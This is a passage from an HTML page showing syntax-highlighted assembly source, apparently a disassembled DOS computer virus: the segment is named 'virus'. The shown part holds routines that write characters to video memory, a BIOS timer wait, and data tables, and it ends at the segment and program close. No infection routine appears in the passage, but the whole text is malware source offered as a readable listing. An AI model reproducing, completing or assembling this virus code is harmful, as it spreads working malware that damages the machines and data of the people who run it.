         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">loc_27</span><span class="sc0">                  </span><span class="sc1">; Jump if above or =</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">data_21e</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">locloop_25</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loc_26</span><span class="sc0">                  </span><span class="sc1">; Jump if not equal</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">loc_26</span><span class="sc0">                  </span><span class="sc1">; Jump if zero</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                  </span><span class="sc1">; ' '</span><span class="sc0">
</span><span class="sc5">loc_26</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; Store ax to es:[di]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">9Eh</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">locloop_25</span><span class="sc0">              </span><span class="sc1">; Loop if cx &gt; 0</span><span class="sc0">

</span><span class="sc5">loc_27</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">sub_8</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">sub_9</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">data_3e</span><span class="sc0">
</span><span class="sc5">loc_29</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">data_3e</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">loc_29</span><span class="sc0">                  </span><span class="sc1">; Jump if equal</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">sub_9</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">87h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0E3h</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E5h</span><span class="sc0">
</span><span class="sc5">data_8</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0E7E6h</span><span class="sc0">                  </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E7h</span><span class="sc0">
</span><span class="sc5">data_9</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0EAE9h</span><span class="sc0">                  </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_10</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">                    </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_11</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">3130h</span><span class="sc0">                   </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_12</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2432h</span><span class="sc0">                   </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">
</span><span class="sc5">data_13</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0E8E3h</span><span class="sc0">                  </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_14</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0EA2Ah</span><span class="sc0">                  </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_15</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0E8E7h</span><span class="sc0">                  </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_16</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2FE9h</span><span class="sc0">                   </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_17</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">6D30h</span><span class="sc0">                   </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_18</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">3332h</span><span class="sc0">                   </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
</span><span class="sc5">data_19</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0E125h</span><span class="sc0">                  </span><span class="sc1">; Data table (indexed access)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0E3h</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">0E7h</span><span class="sc4">,</span><span class="sc2">0E7h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc2">0E7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc2">0EEh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc2">0F4h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">90h</span><span class="sc0">

</span><span class="sc5">virus</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">



         </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">


</span></div></body>
</html>
